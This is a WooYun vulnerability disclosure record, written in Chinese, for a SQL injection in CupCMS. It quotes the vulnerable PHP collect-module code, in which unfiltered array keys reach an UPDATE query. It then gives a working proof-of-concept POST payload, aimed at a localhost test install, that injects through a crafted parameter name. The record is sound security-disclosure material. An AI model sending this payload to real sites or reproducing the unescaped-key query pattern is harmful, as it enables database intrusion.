{"id": 58919, "wybug_id": "wooyun-2014-049119", "wybug_title": " CupCMS最新版sql注入漏洞", "wybug_corp": "CupCMS", "wybug_author": "Matt", "wybug_date": "2014-01-23 14:13", "wybug_open_date": "2014-04-23 14:13", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-23：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-04-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： cupcms 注入漏洞 详细说明：  \ncupcms/modules/collect/index.php  case 'replacerule':    $id = (int)g('id');\t$collect = p('collect');\techo 222;\tif(empty($id))\t{\t  collectinsert($collect);\t} else collectupdate($id,$collect);//这里的collect没有过滤\tadmintips(11,'?m=collect&id='.$collect['model']);    //print_r($collect);exit;cupcms/modules/collect/libs/collect.func.phpfunction collectupdate($id,$data){  $data['data'] = cupserialize($data['data']);  //print_R($data['data']);exit;  c('mysql')->update('cupcms_collect_rule',$data,'id = '.$id);data肯定是生存key和val进行insert的\n   漏洞证明：  测试方式打开 http://127.0.0.1/cup/index.php?m=collect&e=login&c=replacerule&d=replacerulePOST提交collect[title`) values(user())#]=1&id=1然后打开http://127.0.0.1/cup/index.php?m=collect&e=login& 就可以看到结果了\n\n   修复方案：  过滤   版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-01-23 20:37 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  这个真的没意思，站点少之又少    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}